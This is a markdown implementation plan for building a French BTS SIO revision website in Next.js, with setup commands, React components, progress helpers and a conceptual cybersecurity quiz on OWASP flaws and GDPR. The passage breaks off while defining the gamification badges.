# BTSSIO.DEV — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a dark-mode educational revision platform for BTS SIO students (SISR & SLAM options) based on the official Éducation Nationale curriculum.

**Architecture:** Next.js 14 App Router with Tailwind CSS and shadcn/ui. Client-side only (no backend) — progress tracked in localStorage. Pages: Homepage/Dashboard, SISR hub, SLAM hub, Bloc 3 SLAM cybersecurity fiche, Examens zone. Syntax highlighting via Prism.js.

**Tech Stack:** Next.js 14 (App Router), Tailwind CSS v3, shadcn/ui, Lucide React (icons), Prism.js (code highlighting), localStorage (progress), Google Fonts (Fira Code + Fira Sans)

---

## File Structure

```
btssio-dev/
├── app/
│   ├── layout.tsx              # Root layout — fonts, global CSS, metadata
│   ├── page.tsx                # Homepage: Hero + option selector + bento grid + badges
│   ├── globals.css             # CSS variables, Tailwind base, Prism theme
│   ├── sisr/
│   │   └── page.tsx            # SISR module hub (Bloc 1, 2, 3)
│   ├── slam/
│   │   └── page.tsx            # SLAM module hub (Bloc 1, 2, 3)
│   ├── bloc3/
│   │   └── slam/
│   │       └── page.tsx        # Bloc 3 SLAM — Full cybersecurity fiche
│   └── examens/
│       └── page.tsx            # Zone Examens (E4, E5, E6)
├── components/
│   ├── Navbar.tsx              # Top nav — logo, links, option badge
│   ├── Hero.tsx                # Animated terminal hero + option CTA cards
│   ├── BentoGrid.tsx           # Bento grid of module cards
│   ├── ModuleCard.tsx          # Single module card (title, bullets, CTA)
│   ├── ProgressDashboard.tsx   # Logged-in dashboard (progress bars, streak, next exam)
│   ├── BadgesSection.tsx       # Gamification badges row
│   ├── CodeBlock.tsx           # Syntax-highlighted code block (Prism)
│   ├── QuizCard.tsx            # Interactive QCM card (question + 4 choices)
│   ├── RevisionSection.tsx     # Titled section wrapper for fiche pages
│   ├── CheatSheet.tsx          # Bullet-point cheat sheet component
│   ├── OralSimulator.tsx       # Oral questions collapsible cards
│   └── Footer.tsx              # Site footer
├── lib/
│   ├── progress.ts             # localStorage progress read/write helpers
│   └── quiz-data.ts            # Bloc 3 SLAM quiz questions data
├── public/
│   └── favicon.ico
├── tailwind.config.ts          # Design tokens: colors, fonts, spacing
├── next.config.js
└── package.json
```

---

## Task 1: Project Bootstrap

**Files:**
- Create: `package.json`, `tailwind.config.ts`, `next.config.js`, `app/globals.css`

- [ ] **Step 1: Scaffold Next.js project**

```bash
cd /Users/sdjbrl/projects/btssio-dev
npx create-next-app@latest . \
  --typescript \
  --tailwind \
  --eslint \
  --app \
  --no-src-dir \
  --import-alias "@/*" \
  --yes
```

Expected: Project created with `app/`, `tailwind.config.ts`, `package.json`.

- [ ] **Step 2: Install dependencies**

```bash
npm install lucide-react prismjs @types/prismjs
npm install -D @tailwindcss/typography
npx shadcn@latest init --yes --base-color slate --css-variables yes
npx shadcn@latest add badge card progress separator
```

- [ ] **Step 3: Configure Tailwind design tokens**

Replace `tailwind.config.ts` with:

```typescript
import type { Config } from "tailwindcss";

const config: Config = {
  darkMode: ["class"],
  content: [
    "./pages/**/*.{ts,tsx}",
    "./components/**/*.{ts,tsx}",
    "./app/**/*.{ts,tsx}",
  ],
  theme: {
    extend: {
      colors: {
        background:  "#0F172A",
        surface:     "#1B2336",
        "surface-2": "#272F42",
        border:      "#475569",
        foreground:  "#F8FAFC",
        muted:       "#94A3B8",
        // SISR palette
        sisr: {
          primary: "#22C55E",
          secondary: "#0EA5E9",
        },
        // SLAM palette
        slam: {
          primary: "#8B5CF6",
          secondary: "#F97316",
        },
        // Cybersecurity / Bloc 3
        cyber: {
          green: "#00FF41",
          red:   "#EF4444",
        },
        danger: "#EF4444",
      },
      fontFamily: {
        heading: ["Fira Code", "monospace"],
        body:    ["Fira Sans", "sans-serif"],
        code:    ["Fira Code", "monospace"],
      },
      borderRadius: {
        lg: "0.75rem",
        md: "0.5rem",
        sm: "0.375rem",
      },
    },
  },
  plugins: [require("@tailwindcss/typography")],
};
export default config;
```

- [ ] **Step 4: Set up global CSS and Google Fonts**

Replace `app/globals.css` with:

```css
@import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Fira+Sans:wght@300;400;500;600;700&display=swap');

@tailwind base;
@tailwind components;
@tailwind utilities;

:root {
  --background:  #0F172A;
  --surface:     #1B2336;
  --surface-2:   #272F42;
  --border:      #475569;
  --foreground:  #F8FAFC;
  --muted:       #94A3B8;
  --sisr-primary:  #22C55E;
  --slam-primary:  #8B5CF6;
  --cyber-green:   #00FF41;
}

* { box-sizing: border-box; }

body {
  background-color: var(--background);
  color: var(--foreground);
  font-family: "Fira Sans", sans-serif;
}

/* Prism dark theme override */
pre[class*="language-"],
code[class*="language-"] {
  background: #0d1117 !important;
  border: 1px solid var(--border);
  border-radius: 0.5rem;
  font-family: "Fira Code", monospace;
  font-size: 0.875rem;
  line-height: 1.6;
}

/* Scrollbar */
::-webkit-scrollbar { width: 6px; }
::-webkit-scrollbar-track { background: var(--background); }
::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
```

- [ ] **Step 5: Commit**

```bash
cd /Users/sdjbrl/projects/btssio-dev
git add .
git commit -m "feat: bootstrap Next.js project with design tokens"
```

---

## Task 2: Core Layout & Navbar

**Files:**
- Create: `components/Navbar.tsx`, `components/Footer.tsx`
- Modify: `app/layout.tsx`

- [ ] **Step 1: Create Navbar**

Create `components/Navbar.tsx`:

```tsx
"use client";
import Link from "next/link";
import { useState } from "react";
import { Shield, Network, Code2, BookOpen, TrendingUp, Menu, X, Hexagon } from "lucide-react";

const navLinks = [
  {
    label: "Tronc Commun",
    href: "#",
    sub: [
      { label: "Culture Générale & Expression", href: "/tronc-commun/cge" },
      { label: "Anglais", href: "/tronc-commun/anglais" },
      { label: "Mathématiques", href: "/tronc-commun/maths" },
      { label: "CEJM", href: "/tronc-commun/cejm" },
      { label: "Bloc 1 Commun", href: "/tronc-commun/bloc1" },
    ],
  },
  {
    label: "SISR",
    href: "/sisr",
    icon: Network,
    color: "text-sisr-primary",
  },
  {
    label: "SLAM",
    href: "/slam",
    icon: Code2,
    color: "text-slam-primary",
  },
  { label: "Examens", href: "/examens", icon: BookOpen },
  { label: "Progression", href: "/progression", icon: TrendingUp },
];

export default function Navbar() {
  const [open, setOpen] = useState(false);

  return (
    <nav className="sticky top-0 z-50 bg-surface/90 backdrop-blur border-b border-border">
      <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
        {/* Logo */}
        <Link href="/" className="flex items-center gap-2 font-heading font-bold text-lg text-foreground">
          <Hexagon className="w-7 h-7 text-sisr-primary" />
          <span>BTSSIO<span className="text-sisr-primary">.DEV</span></span>
        </Link>

        {/* Desktop nav */}
        <div className="hidden md:flex items-center gap-6">
          {navLinks.map((link) => (
            <Link
              key={link.label}
              href={link.href}
              className={`text-sm font-body font-medium text-muted hover:text-foreground transition-colors ${link.color ?? ""}`}
            >
              {link.label}
            </Link>
          ))}
        </div>

        {/* Auth buttons */}
        <div className="hidden md:flex items-center gap-3">
          <Link href="/login" className="text-sm text-muted hover:text-foreground transition-colors">
            Se connecter
          </Link>
          <Link
            href="/inscription"
            className="text-sm bg-sisr-primary text-background font-semibold px-4 py-1.5 rounded-md hover:bg-sisr-primary/90 transition-colors"
          >
            S'inscrire
          </Link>
        </div>

        {/* Mobile toggle */}
        <button
          className="md:hidden text-muted p-2"
          onClick={() => setOpen(!open)}
          aria-label={open ? "Fermer le menu" : "Ouvrir le menu"}
        >
          {open ? <X size={22} /> : <Menu size={22} />}
        </button>
      </div>

      {/* Mobile menu */}
      {open && (
        <div className="md:hidden bg-surface border-t border-border px-4 py-4 flex flex-col gap-3">
          {navLinks.map((link) => (
            <Link
              key={link.label}
              href={link.href}
              className={`text-sm font-body font-medium text-muted hover:text-foreground py-1 ${link.color ?? ""}`}
              onClick={() => setOpen(false)}
            >
              {link.label}
            </Link>
          ))}
          <hr className="border-border my-1" />
          <Link href="/inscription" className="text-sm bg-sisr-primary text-background font-semibold px-4 py-2 rounded-md text-center">
            S'inscrire gratuitement
          </Link>
        </div>
      )}
    </nav>
  );
}
```

- [ ] **Step 2: Create Footer**

Create `components/Footer.tsx`:

```tsx
import Link from "next/link";
import { Hexagon } from "lucide-react";

const links = [
  { label: "Accueil", href: "/" },
  { label: "SISR", href: "/sisr" },
  { label: "SLAM", href: "/slam" },
  { label: "Examens", href: "/examens" },
  { label: "À propos", href: "/a-propos" },
];

export default function Footer() {
  return (
    <footer className="border-t border-border mt-24 py-10 bg-surface/40">
      <div className="max-w-7xl mx-auto px-4 flex flex-col md:flex-row items-center justify-between gap-6">
        <div className="flex items-center gap-2 font-heading text-muted text-sm">
          <Hexagon className="w-5 h-5 text-sisr-primary" />
          <span>BTSSIO.DEV</span>
        </div>
        <nav className="flex flex-wrap justify-center gap-5">
          {links.map((l) => (
            <Link key={l.label} href={l.href} className="text-xs text-muted hover:text-foreground transition-colors">
              {l.label}
            </Link>
          ))}
        </nav>
        <p className="text-xs text-muted text-center">
          Conforme BO spécial n°5 du 11 avril 2019 — Référentiel officiel EN
        </p>
      </div>
    </footer>
  );
}
```

- [ ] **Step 3: Update root layout**

Replace `app/layout.tsx`:

```tsx
import type { Metadata } from "next";
import "./globals.css";
import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";

export const metadata: Metadata = {
  title: "BTSSIO.DEV — Plateforme de révision BTS SIO",
  description:
    "Révisez votre BTS SIO (SISR & SLAM) avec des fiches, QCM et TP basés sur le référentiel officiel de l'Éducation Nationale.",
};

export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="fr" className="dark">
      <body className="min-h-screen bg-background text-foreground antialiased">
        <Navbar />
        <main>{children}</main>
        <Footer />
      </body>
    </html>
  );
}
```

- [ ] **Step 4: Commit**

```bash
git add .
git commit -m "feat: add Navbar, Footer and root layout"
```

---

## Task 3: Progress Helpers & Quiz Data

**Files:**
- Create: `lib/progress.ts`, `lib/quiz-data.ts`

- [ ] **Step 1: Create localStorage progress helpers**

Create `lib/progress.ts`:

```typescript
export interface UserProgress {
  option: "SISR" | "SLAM" | null;
  modules: Record<string, number>; // moduleId → % completion 0-100
  streak: number;
  lastVisit: string; // ISO date
  badges: string[];
}

const KEY = "btssio_progress";

export function getProgress(): UserProgress {
  if (typeof window === "undefined") return defaultProgress();
  try {
    const stored = localStorage.getItem(KEY);
    return stored ? JSON.parse(stored) : defaultProgress();
  } catch {
    return defaultProgress();
  }
}

export function saveProgress(p: UserProgress): void {
  if (typeof window === "undefined") return;
  localStorage.setItem(KEY, JSON.stringify(p));
}

export function setOption(option: "SISR" | "SLAM"): void {
  const p = getProgress();
  saveProgress({ ...p, option });
}

export function updateModuleProgress(moduleId: string, pct: number): void {
  const p = getProgress();
  p.modules[moduleId] = Math.min(100, Math.max(0, pct));
  checkBadges(p);
  saveProgress(p);
}

function checkBadges(p: UserProgress): void {
  const allBloc3 = ["bloc3-slam-owasp", "bloc3-slam-rgpd", "bloc3-slam-auth", "bloc3-slam-comms", "bloc3-slam-bdd"];
  if (allBloc3.every((id) => (p.modules[id] ?? 0) >= 100) && !p.badges.includes("gardien-donnees")) {
    p.badges.push("gardien-donnees");
  }
  if ((p.modules["bloc3-slam-owasp"] ?? 0) >= 80 && !p.badges.includes("maitre-owasp")) {
    p.badges.push("maitre-owasp");
  }
}

function defaultProgress(): UserProgress {
  return { option: null, modules: {}, streak: 0, lastVisit: "", badges: [] };
}
```

- [ ] **Step 2: Create Bloc 3 SLAM quiz data**

Create `lib/quiz-data.ts`:

```typescript
export interface QuizQuestion {
  id: string;
  question: string;
  choices: string[];
  correct: number; // index
  explanation: string;
}

export const bloc3SlamQuiz: QuizQuestion[] = [
  {
    id: "q1",
    question:
      "Une requête SQL construite en concaténant directement les entrées utilisateur expose à quelle type de faille ?",
    choices: ["XSS (Cross-Site Scripting)", "CSRF", "Injection SQL", "Broken Access Control"],
    correct: 2,
    explanation:
      "L'injection SQL survient quand les entrées utilisateur sont directement interpolées dans une requête SQL. La solution est d'utiliser des requêtes préparées avec PDO.",
  },
  {
    id: "q2",
    question:
      "Quelle fonction PHP est recommandée pour hacher un mot de passe de façon sécurisée en 2024 ?",
    choices: ["md5()", "sha256()", "crypt()", "password_hash() avec PASSWORD_ARGON2ID"],
    correct: 3,
    explanation:
      "password_hash() avec PASSWORD_ARGON2ID est l'algorithme recommandé. MD5 et SHA1 sont obsolètes et crackables via des rainbow tables.",
  },
  {
    id: "q3",
    question:
      "Le RGPD impose de notifier une violation de données personnelles à la CNIL dans quel délai ?",
    choices: ["24 heures", "48 heures", "72 heures", "1 semaine"],
    correct: 2,
    explanation:
      "L'article 33 du RGPD impose une notification à l'autorité de contrôle (CNIL en France) dans les 72 heures suivant la prise de connaissance d'une violation.",
  },
  {
    id: "q4",
    question:
      "Un attaquant forge une requête HTTP depuis un site malveillant en exploitant la session active d'un utilisateur. Il s'agit de :",
    choices: ["Injection SQL", "XSS Reflected", "CSRF (Cross-Site Request Forgery)", "IDOR"],
    correct: 2,
    explanation:
      "Le CSRF exploite la confiance qu'a l'application envers le navigateur de l'utilisateur connecté. La contre-mesure principale est le jeton CSRF (Synchronizer Token Pattern).",
  },
  {
    id: "q5",
    question:
      "L'en-tête HTTP 'Strict-Transport-Security' permet de :",
    choices: [
      "Empêcher le clickjacking",
      "Forcer l'utilisation de HTTPS",
      "Bloquer les scripts inline",
      "Masquer la version du serveur",
    ],
    correct: 1,
    explanation:
      "HSTS (HTTP Strict Transport Security) indique au navigateur de toujours utiliser HTTPS pour ce domaine, même si l'utilisateur tape http://",
  },
  {
    id: "q6",
    question: "Le principe 'Privacy by Design' signifie :",
    choices: [
      "Chiffrer toutes les données de l'application",
      "Intégrer la protection des données dès la conception",
      "Demander le consentement à chaque connexion",
      "Anonymiser toutes les données utilisateur",
    ],
    correct: 1,
    explanation:
      "Privacy by Design (Art. 25 RGPD) impose d'intégrer la protection des données personnelles dès la phase de conception, et non après coup.",
  },
  {
    id: "q7",
    question: "L'IDOR (Insecure Direct Object Reference) est un exemple de :",
    choices: [
      "Injection SQL",
      "XSS Stored",
      "Broken Access Control",
      "CSRF",
    ],
    correct: 2,
    explanation:
      "L'IDOR est une faille de contrôle d'accès (OWASP #1) où un attaquant peut accéder à des ressources d'autres utilisateurs en modifiant un identifiant dans l'URL.",
  },
];
```

- [ ] **Step 3: Commit**

```bash
git add .
git commit -m "feat: add progress helpers and quiz data"
```

---

## Task 4: Reusable Components

**Files:**
- Create: `components/CodeBlock.tsx`, `components/QuizCard.tsx`, `components/RevisionSection.tsx`, `components/CheatSheet.tsx`

- [ ] **Step 1: Create CodeBlock with Prism**

Create `components/CodeBlock.tsx`:

```tsx
"use client";
import { useEffect, useRef } from "react";
import Prism from "prismjs";
import "prismjs/components/prism-php";
import "prismjs/components/prism-sql";
import "prismjs/components/prism-bash";
import "prismjs/components/prism-http";
import "prismjs/components/prism-typescript";
import "prismjs/themes/prism-tomorrow.css";

interface Props {
  code: string;
  language: string;
  filename?: string;
}

export default function CodeBlock({ code, language, filename }: Props) {
  const ref = useRef<HTMLElement>(null);

  useEffect(() => {
    if (ref.current) Prism.highlightElement(ref.current);
  }, [code]);

  return (
    <div className="rounded-lg overflow-hidden border border-border my-4">
      {filename && (
        <div className="bg-surface-2 px-4 py-2 text-xs font-code text-muted border-b border-border flex items-center gap-2">
          <span className="w-3 h-3 rounded-full bg-danger/70 inline-block" />
          <span className="w-3 h-3 rounded-full bg-sisr-primary/70 inline-block" />
          <span className="w-3 h-3 rounded-full bg-slam-primary/70 inline-block" />
          <span className="ml-2">{filename}</span>
        </div>
      )}
      <pre className="m-0 overflow-x-auto">
        <code ref={ref} className={`language-${language}`}>{code.trim()}</code>
      </pre>
    </div>
  );
}
```

- [ ] **Step 2: Create interactive QuizCard**

Create `components/QuizCard.tsx`:

```tsx
"use client";
import { useState } from "react";
import { CheckCircle, XCircle, HelpCircle } from "lucide-react";
import type { QuizQuestion } from "@/lib/quiz-data";

interface Props {
  question: QuizQuestion;
  number: number;
}

export default function QuizCard({ question, number }: Props) {
  const [selected, setSelected] = useState<number | null>(null);
  const isCorrect = selected === question.correct;

  return (
    <div className="rounded-lg border border-border bg-surface p-6 mb-4">
      <div className="flex items-start gap-3 mb-4">
        <HelpCircle className="w-5 h-5 text-slam-primary mt-0.5 shrink-0" />
        <p className="font-body font-medium text-foreground text-sm leading-relaxed">
          <span className="text-muted text-xs mr-2">Q{number}.</span>
          {question.question}
        </p>
      </div>

      <div className="grid gap-2">
        {question.choices.map((choice, i) => {
          let style = "border-border bg-surface-2 text-muted hover:border-muted";
          if (selected !== null) {
            if (i === question.correct) style = "border-sisr-primary bg-sisr-primary/10 text-sisr-primary";
            else if (i === selected && !isCorrect) style = "border-danger bg-danger/10 text-danger";
          }
          return (
            <button
              key={i}
              onClick={() => !selected && setSelected(i)}
              disabled={selected !== null}
              className={`w-full text-left text-sm px-4 py-3 rounded-md border transition-all font-body ${style} disabled:cursor-default`}
            >
              <span className="font-code mr-2 text-xs opacity-60">{String.fromCharCode(97 + i)})</span>
              {choice}
            </button>
          );
        })}
      </div>

      {selected !== null && (
        <div className={`mt-4 flex gap-3 p-4 rounded-md text-sm font-body ${isCorrect ? "bg-sisr-primary/10 text-sisr-primary border border-sisr-primary/30" : "bg-danger/10 text-danger border border-danger/30"}`}>
          {isCorrect ? <CheckCircle className="w-5 h-5 shrink-0 mt-0.5" /> : <XCircle className="w-5 h-5 shrink-0 mt-0.5" />}
          <div>
            <p className="font-semibold mb-1">{isCorrect ? "Bonne réponse !" : "Mauvaise réponse"}</p>
            <p className="opacity-90 text-xs leading-relaxed">{question.explanation}</p>
          </div>
        </div>
      )}
    </div>
  );
}
```

- [ ] **Step 3: Create RevisionSection wrapper**

Create `components/RevisionSection.tsx`:

```tsx
interface Props {
  title: string;
  subtitle?: string;
  icon?: React.ReactNode;
  accent?: "sisr" | "slam" | "cyber";
  children: React.ReactNode;
}

const accentColors = {
  sisr:  "border-sisr-primary/40 bg-sisr-primary/5",
  slam:  "border-slam-primary/40 bg-slam-primary/5",
  cyber: "border-cyber-green/40 bg-cyber-green/5",
};

const titleColors = {
  sisr:  "text-sisr-primary",
  slam:  "text-slam-primary",
  cyber: "text-cyber-green",
};

export default function RevisionSection({ title, subtitle, icon, accent = "slam", children }: Props) {
  return (
    <section className={`rounded-xl border ${accentColors[accent]} p-6 mb-8`}>
      <div className="flex items-center gap-3 mb-4">
        {icon && <span className={titleColors[accent]}>{icon}</span>}
        <div>
          <h2 className={`font-heading font-bold text-lg ${titleColors[accent]}`}>{title}</h2>
          {subtitle && <p className="text-xs text-muted mt-0.5 font-body">{subtitle}</p>}
        </div>
      </div>
      <div className="font-body text-sm leading-relaxed text-foreground/90">{children}</div>
    </section>
  );
}
```

- [ ] **Step 4: Create CheatSheet component**

Create `components/CheatSheet.tsx`:

```tsx
interface CheatItem {
  label: string;
  value?: string;
  highlight?: boolean;
  danger?: boolean;
}

interface Props {
  items: CheatItem[];
  columns?: 1 | 2;
}

export default function CheatSheet({ items, columns = 1 }: Props) {
  return (
    <ul className={`grid gap-2 ${columns === 2 ? "sm:grid-cols-2" : ""}`}>
      {items.map((item, i) => (
        <li
          key={i}
          className={`flex items-start gap-2 text-sm px-3 py-2 rounded-md border
            ${item.danger
              ? "border-danger/30 bg-danger/5 text-danger"
              : item.highlight
              ? "border-sisr-primary/30 bg-sisr-primary/5 text-sisr-primary"
              : "border-border bg-surface-2 text-foreground/80"
            }`}
        >
          <span className="text-muted font-code text-xs mt-0.5">
            {item.danger ? "✗" : item.highlight ? "✓" : "·"}
          </span>
          <span>
            <span className="font-semibold">{item.label}</span>
            {item.value && <span className="text-muted ml-1">— {item.value}</span>}
          </span>
        </li>
      ))}
    </ul>
  );
}
```

- [ ] **Step 5: Commit**

```bash
git add .
git commit -m "feat: add CodeBlock, QuizCard, RevisionSection, CheatSheet components"
```

---

## Task 5: Hero & Option Cards (Homepage)

**Files:**
- Create: `components/Hero.tsx`

- [ ] **Step 1: Create Hero with animated terminal**

Create `components/Hero.tsx`:

```tsx
"use client";
import { useState, useEffect } from "react";
import Link from "next/link";
import { Network, Code2, ChevronRight } from "lucide-react";

const LINES = [
  "> Initialisation BTS SIO Révision...",
  "> Chargement du référentiel officiel EN... ✓",
  "> Options détectées: [SISR] [SLAM]",
  "> Modules disponibles: Bloc 1, 2, 3, Examens",
  "> Prêt. Bonne chance pour tes révisions. _",
];

export default function Hero() {
  const [visibleLines, setVisibleLines] = useState<string[]>([]);

  useEffect(() => {
    let i = 0;
    const interval = setInterval(() => {
      if (i < LINES.length) {
        setVisibleLines((prev) => [...prev, LINES[i]]);
        i++;
      } else {
        clearInterval(interval);
      }
    }, 600);
    return () => clearInterval(interval);
  }, []);

  return (
    <section className="max-w-7xl mx-auto px-4 pt-16 pb-12">
      {/* Terminal */}
      <div className="max-w-2xl mx-auto mb-12">
        <div className="rounded-lg border border-border bg-[#0d1117] overflow-hidden">
          <div className="flex items-center gap-2 px-4 py-3 bg-surface-2 border-b border-border">
            <span className="w-3 h-3 rounded-full bg-danger/70" />
            <span className="w-3 h-3 rounded-full bg-sisr-primary/70" />
            <span className="w-3 h-3 rounded-full bg-slam-primary/70" />
            <span className="ml-2 text-xs text-muted font-code">btssio.dev — terminal</span>
          </div>
          <div className="p-4 font-code text-sm text-sisr-primary min-h-[140px]">
            {visibleLines.map((line, i) => (
              <p key={i} className={i === visibleLines.length - 1 ? "animate-pulse" : ""}>
                {line}
              </p>
            ))}
          </div>
        </div>
      </div>

      {/* Heading */}
      <div className="text-center mb-12">
        <h1 className="font-heading font-bold text-3xl md:text-5xl text-foreground leading-tight mb-4">
          Réussir ton BTS SIO,{" "}
          <span className="text-sisr-primary">module par module.</span>
        </h1>
        <p className="text-muted font-body text-base md:text-lg max-w-xl mx-auto leading-relaxed">
          Cours, QCM, TP guidés et simulateur d'oral basés sur le référentiel
          officiel de l'Éducation Nationale.
        </p>
      </div>

      {/* Option Cards */}
      <div className="grid sm:grid-cols-2 gap-6 max-w-2xl mx-auto">
        {/* SISR */}
        <Link
          href="/sisr"
          className="group rounded-xl border border-sisr-primary/30 bg-sisr-primary/5 p-6 hover:bg-sisr-primary/10 hover:border-sisr-primary/60 transition-all"
        >
          <div className="flex items-center gap-3 mb-3">
            <div className="p-2 rounded-lg bg-sisr-primary/20">
              <Network className="w-6 h-6 text-sisr-primary" />
            </div>
            <div>
              <p className="font-heading font-bold text-sisr-primary">SISR</p>
              <p className="text-xs text-muted font-body">Infrastructure & Réseaux</p>
            </div>
          </div>
          <p className="text-sm text-muted font-body leading-relaxed mb-4">
            Windows Server, Linux, Routage, VLANs, Firewall, VPN, Cybersécurité infra.
          </p>
          <span className="inline-flex items-center gap-1 text-sisr-primary text-sm font-semibold group-hover:gap-2 transition-all">
            Commencer SISR <ChevronRight size={16} />
          </span>
        </Link>

        {/* SLAM */}
        <Link
          href="/slam"
          className="group rounded-xl border border-slam-primary/30 bg-slam-primary/5 p-6 hover:bg-slam-primary/10 hover:border-slam-primary/60 transition-all"
        >
          <div className="flex items-center gap-3 mb-3">
            <div className="p-2 rounded-lg bg-slam-primary/20">
              <Code2 className="w-6 h-6 text-slam-primary" />
            </div>
            <div>
              <p className="font-heading font-bold text-slam-primary">SLAM</p>
              <p className="text-xs text-muted font-body">Développement Applicatif</p>
            </div>
          </div>
          <p className="text-sm text-muted font-body leading-relaxed mb-4">
            POO, SQL, MVC, API REST, Dev Web/Mobile, OWASP, RGPD, Sécurité code.
          </p>
          <span className="inline-flex items-center gap-1 text-slam-primary text-sm font-semibold group-hover:gap-2 transition-all">
            Commencer SLAM <ChevronRight size={16} />
          </span>
        </Link>
      </div>
    </section>
  );
}
```

- [ ] **Step 2: Commit**

```bash
git add .
git commit -m "feat: add animated Hero section with option selector"
```

---

## Task 6: Bento Grid & Badges (Homepage)

**Files:**
- Create: `components/BentoGrid.tsx`, `components/BadgesSection.tsx`, `components/ModuleCard.tsx`

- [ ] **Step 1: Create ModuleCard**

Create `components/ModuleCard.tsx`:

```tsx
import Link from "next/link";
import { ChevronRight } from "lucide-react";

interface Props {
  title: string;
  subtitle?: string;
  icon: React.ReactNode;
  bullets: string[];
  href: string;
  accent: "sisr" | "slam" | "cyber" | "default";
  size?: "normal" | "large";
}

const accents = {
  sisr:    { border: "border-sisr-primary/30",  bg: "bg-sisr-primary/5",  text: "text-sisr-primary",  hover: "hover:bg-sisr-primary/10 hover:border-sisr-primary/50" },
  slam:    { border: "border-slam-primary/30",  bg: "bg-slam-primary/5",  text: "text-slam-primary",  hover: "hover:bg-slam-primary/10 hover:border-slam-primary/50" },
  cyber:   { border: "border-cyber-green/30",   bg: "bg-cyber-green/5",   text: "text-cyber-green",   hover: "hover:bg-cyber-green/10  hover:border-cyber-green/50"  },
  default: { border: "border-border",           bg: "bg-surface",         text: "text-foreground",    hover: "hover:bg-surface-2" },
};

export default function ModuleCard({ title, subtitle, icon, bullets, href, accent, size = "normal" }: Props) {
  const a = accents[accent];
  return (
    <Link
      href={href}
      className={`group rounded-xl border ${a.border} ${a.bg} ${a.hover} p-6 flex flex-col gap-3 transition-all ${size === "large" ? "md:col-span-2" : ""}`}
    >
      <div className="flex items-center gap-3">
        <span className={a.text}>{icon}</span>
        <div>
          <h3 className={`font-heading font-bold text-base ${a.text}`}>{title}</h3>
          {subtitle && <p className="text-xs text-muted font-body">{subtitle}</p>}
        </div>
      </div>
      <ul className="flex flex-col gap-1.5">
        {bullets.map((b, i) => (
          <li key={i} className="text-xs text-muted font-body flex items-start gap-1.5">
            <span className={`${a.text} opacity-60 mt-0.5`}>▸</span> {b}
          </li>
        ))}
      </ul>
      <span className={`inline-flex items-center gap-1 text-xs ${a.text} font-semibold mt-auto group-hover:gap-2 transition-all`}>
        Accéder <ChevronRight size={13} />
      </span>
    </Link>
  );
}
```

- [ ] **Step 2: Create BentoGrid**

Create `components/BentoGrid.tsx`:

```tsx
import { BookOpen, Server, Code2, Shield, Calculator, Globe } from "lucide-react";
import ModuleCard from "./ModuleCard";

const modules = [
  {
    title: "Tronc Commun",
    subtitle: "Général & Informatique",
    icon: <BookOpen size={22} />,
    bullets: ["CGE & CEJM", "Culture Générale & Expression", "Bloc 1 — Support services informatiques"],
    href: "/tronc-commun",
    accent: "default" as const,
    size: "normal" as const,
  },
  {
    title: "Mathématiques",
    subtitle: "Pour l'informatique",
    icon: <Calculator size={22} />,
    bullets: ["Algorithmique & graphes", "Matrices & arithmétique", "Cryptographie asymétrique"],
    href: "/tronc-commun/maths",
    accent: "default" as const,
  },
  {
    title: "Anglais Technique",
    subtitle: "Compréhension & expression",
    icon: <Globe size={22} />,
    bullets: ["Vocabulaire réseau & dev", "Compréhension de textes", "Expression orale technique"],
    href: "/tronc-commun/anglais",
    accent: "default" as const,
  },
  {
    title: "SISR — Bloc 2",
    subtitle: "Administration systèmes & réseaux",
    icon: <Server size={22} />,
    bullets: [
      "Windows Server 2022 — AD, GPO, DNS, DHCP",
      "Linux — Administration, scripting Bash",
      "Routage OSPF, RIP, BGP & VLANs (802.1Q)",
      "Services : FTP, NFS, NTP, RADIUS",
      "Packet Tracer & GNS3 — Labs guidés",
    ],
    href: "/sisr/bloc2",
    accent: "sisr" as const,
    size: "large" as const,
  },
  {
    title: "SLAM — Bloc 2",
    subtitle: "Conception & développement",
    icon: <Code2 size={22} />,
    bullets: [
      "POO — PHP, Python, Java",
      "Bases de données SQL & Merise",
      "Architecture MVC (Laravel, Symfony)",
      "API REST & Web Services",
      "Développement mobile (React Native)",
    ],
    href: "/slam/bloc2",
    accent: "slam" as const,
    size: "large" as const,
  },
  {
    title: "Bloc 3 — Cybersécurité",
    subtitle: "SISR & SLAM — Épreuve E6",
    icon: <Shield size={22} />,
    bullets: [
      "OWASP Top 10 — Injections, XSS, CSRF, IDOR",
      "RGPD & protection des données",
      "Sécurisation des bases de données",
      "SISR : Firewall, VPN, PRA/PCA, SIEM",
      "Hachage sécurisé & authentification MFA",
    ],
    href: "/bloc3/slam",
    accent: "cyber" as const,
    size: "large" as const,
  },
];

export default function BentoGrid() {
  return (
    <section className="max-w-7xl mx-auto px-4 py-12">
      <h2 className="font-heading font-bold text-2xl text-foreground mb-2">
        Modules disponibles
      </h2>
      <p className="text-muted font-body text-sm mb-8">
        Tous les blocs du référentiel officiel, structurés pour une révision efficace.
      </p>
      <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
        {modules.map((m) => (
          <ModuleCard key={m.title} {...m} />
        ))}
      </div>
    </section>
  );
}
```

- [ ] **Step 3: Create BadgesSection**

Create `components/BadgesSection.tsx`:

```tsx
const badges = [
  { id: "expert-reseau",    label: "Expert Réseau",     icon: "🖧", desc: "Compléter tous les modules SISR Bloc 2",  locked: true  },
  { id: "as-du-sql",        label: "As du SQL",          icon: "🗄️", desc: "Score 100% au QCM SQL avancé",           locked: true  },
  { id: "hacker-ethique",   label: "Hacker Éthique",     icon: "🛡️", desc: "Compléter les 3 TP pentest guidés",      locked: true  },
  { id: "architecte-mvc",   label: "Architecte MVC",     icon: "⚙️", desc: "Compléter le module Architecture MVC",   locked: true  },
  { id: "assidu",           label: "Assidu",             icon: "🔥", desc: "7 jours consécutifs de révision",        locked: false },
  { id: "maitre-owasp",     label: "Maître OWASP",       icon: "🔐", desc: "Valider les 10 failles OWASP",           locked: true  },
  { id: "gardien-donnees",  label: "Gardien des Données",icon: "🏅", desc: "Compléter tout le Bloc 3 SLAM",          locked: true  },
